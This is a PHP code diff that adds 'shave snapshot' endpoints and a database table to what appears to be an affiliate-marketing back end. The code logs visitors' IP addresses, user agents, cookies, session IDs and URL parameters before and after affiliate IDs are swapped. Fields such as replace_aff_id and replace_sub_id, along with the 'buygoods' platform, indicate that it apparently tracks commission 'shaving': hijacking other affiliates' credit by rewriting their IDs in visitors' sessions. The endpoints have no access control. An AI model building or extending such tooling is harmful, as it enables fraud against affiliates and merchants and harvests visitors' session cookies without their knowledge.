@@ -116,6 +116,17 @@ try {
             getUniqueAffiliates($pdo);
             break;
 
+        // Shave snapshot endpoints (before/after comparison)
+        case 'log_shave_snapshot':
+        case 'logShaveSnapshot':
+            logShaveSnapshot($pdo);
+            break;
+
+        case 'get_shave_snapshots':
+        case 'getShaveSnapshots':
+            getShaveSnapshots($pdo);
+            break;
+
         default:
             http_response_code(404);
             echo json_encode(['error' => 'Invalid endpoint']);
@@ -1565,5 +1576,174 @@ function getPeriodWhereClause($period) {
         default:
             return "1=1";
     }
+}
+
+// ================================================================
+// SHAVE SNAPSHOTS — Before/After comparison (IP+UA matched)
+// ================================================================
+
+function ensureShaveSnapshotsTable($pdo) {
+    $pdo->exec("CREATE TABLE IF NOT EXISTS shave_snapshots (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        domain_id INT NOT NULL,
+        ip_address VARCHAR(45) NOT NULL,
+        user_agent VARCHAR(512) DEFAULT '',
+        phase ENUM('before','after') NOT NULL,
+        session_id INT DEFAULT NULL,
+        aff_id VARCHAR(100) DEFAULT '',
+        sub_id VARCHAR(100) DEFAULT '',
+        mode VARCHAR(20) DEFAULT '',
+        replace_aff_id VARCHAR(100) DEFAULT '',
+        replace_sub_id VARCHAR(100) DEFAULT '',
+        platform VARCHAR(20) DEFAULT 'buygoods',
+        url TEXT,
+        sessid2 VARCHAR(200) DEFAULT '',
+        cookies JSON,
+        cookie_count INT DEFAULT 0,
+        url_params JSON,
+        matched_id INT DEFAULT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        INDEX idx_ip_ua_domain (ip_address, domain_id, phase),
+        INDEX idx_matched (matched_id),
+        INDEX idx_created (created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+}
+
+function logShaveSnapshot($pdo) {
+    $data = json_decode(file_get_contents('php://input'), true);
+    $phase = $data['phase'] ?? '';
+    $domainId = (int)($data['domain_id'] ?? 0);
+
+    if (!in_array($phase, ['before', 'after']) || !$domainId) {
+        echo json_encode(['success' => false, 'error' => 'Invalid phase or domain_id']);
+        return;
+    }
+
+    // Get visitor IP + UA
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
+    if (strpos($ip, ',') !== false) $ip = trim(explode(',', $ip)[0]);
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    ensureShaveSnapshotsTable($pdo);
+
+    if ($phase === 'before') {
+        $stmt = $pdo->prepare("INSERT INTO shave_snapshots
+            (domain_id, ip_address, user_agent, phase, session_id, aff_id, sub_id, mode, replace_aff_id, replace_sub_id, platform, url, sessid2, cookies, cookie_count, url_params)
+            VALUES (?, ?, ?, 'before', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+        $stmt->execute([
+            $domainId, $ip, $ua,
+            $data['session_id'] ?? null,
+            $data['aff_id'] ?? '',
+            $data['sub_id'] ?? '',
+            $data['mode'] ?? '',
+            $data['replace_aff_id'] ?? '',
+            $data['replace_sub_id'] ?? '',
+            $data['platform'] ?? 'buygoods',
+            $data['url'] ?? '',
+            $data['sessid2'] ?? '',
+            $data['cookies'] ?? '{}',
+            (int)($data['cookie_count'] ?? 0),
+            $data['url_params'] ?? '{}'
+        ]);
+        echo json_encode(['success' => true, 'phase' => 'before', 'id' => $pdo->lastInsertId()]);
+
+    } else {
+        // AFTER phase — find the most recent unmatched BEFORE for this IP+UA+domain (within 60s)
+        $stmt = $pdo->prepare("SELECT id FROM shave_snapshots
+            WHERE ip_address = ? AND domain_id = ? AND phase = 'before' AND matched_id IS NULL
+            AND created_at >= NOW() - INTERVAL 60 SECOND
+            ORDER BY created_at DESC LIMIT 1");
+        $stmt->execute([$ip, $domainId]);
+        $beforeRow = $stmt->fetch();
+        $matchedId = $beforeRow ? (int)$beforeRow['id'] : null;
+
+        $stmt = $pdo->prepare("INSERT INTO shave_snapshots
+            (domain_id, ip_address, user_agent, phase, url, sessid2, cookies, cookie_count, url_params, matched_id)
+            VALUES (?, ?, ?, 'after', ?, ?, ?, ?, ?, ?)");
+        $stmt->execute([
+            $domainId, $ip, $ua,
+            $data['url'] ?? '',
+            $data['sessid2'] ?? '',
+            $data['cookies'] ?? '{}',
+            (int)($data['cookie_count'] ?? 0),
+            $data['url_params'] ?? '{}',
+            $matchedId
+        ]);
+        $afterId = $pdo->lastInsertId();
+
+        // Mark the before row as matched
+        if ($matchedId) {
+            $pdo->prepare("UPDATE shave_snapshots SET matched_id = ? WHERE id = ?")->execute([$afterId, $matchedId]);
+        }
+
+        echo json_encode(['success' => true, 'phase' => 'after', 'id' => $afterId, 'matched_before_id' => $matchedId]);
+    }
+}
+
+function getShaveSnapshots($pdo) {
+    ensureShaveSnapshotsTable($pdo);
+
+    $data = $method = $_SERVER['REQUEST_METHOD'] === 'GET' ? $_GET : json_decode(file_get_contents('php://input'), true);
+    $domainId = (int)($data['domain_id'] ?? 0);
+    $limit = (int)($data['limit'] ?? 50);
+    $offset = (int)($data['offset'] ?? 0);
+
+    // Get BEFORE snapshots that have been matched with an AFTER
+    $query = "SELECT
+        b.id as before_id,
+        b.created_at as shave_time,
+        b.ip_address,
+        b.aff_id,
+        b.sub_id,
+        b.mode,
+        b.replace_aff_id,
+        b.replace_sub_id,
+        b.platform,
+        b.url as before_url,
+        b.sessid2 as before_sessid2,
+        b.cookies as before_cookies,
+        b.cookie_count as before_cookie_count,
+        b.url_params as before_params,
+        b.matched_id as after_id,
+        a.url as after_url,
+        a.sessid2 as after_sessid2,
+        a.cookies as after_cookies,
+        a.cookie_count as after_cookie_count,
+        a.url_params as after_params,
+        a.created_at as after_time
+    FROM shave_snapshots b
+    LEFT JOIN shave_snapshots a ON b.matched_id = a.id AND a.phase = 'after'
+    WHERE b.phase = 'before'";
+
+    $params = [];
+    if ($domainId) {
+        $query .= " AND b.domain_id = ?";
+        $params[] = $domainId;
+    }
+
+    $query .= " ORDER BY b.created_at DESC LIMIT $limit OFFSET $offset";
+
+    $stmt = $pdo->prepare($query);
+    $stmt->execute($params);
+    $snapshots = $stmt->fetchAll();
+
+    // Get total count
+    $countQuery = "SELECT COUNT(*) as total FROM shave_snapshots WHERE phase = 'before'";
+    $countParams = [];
+    if ($domainId) {
+        $countQuery .= " AND domain_id = ?";
+        $countParams[] = $domainId;
+    }
+    $countStmt = $pdo->prepare($countQuery);
+    $countStmt->execute($countParams);
+    $total = (int)$countStmt->fetch()['total'];
+
+    echo json_encode([
+        'success' => true,
+        'data' => $snapshots,
+        'total' => $total,
+        'limit' => $limit,
+        'offset' => $offset
+    ]);
 }
 ?>
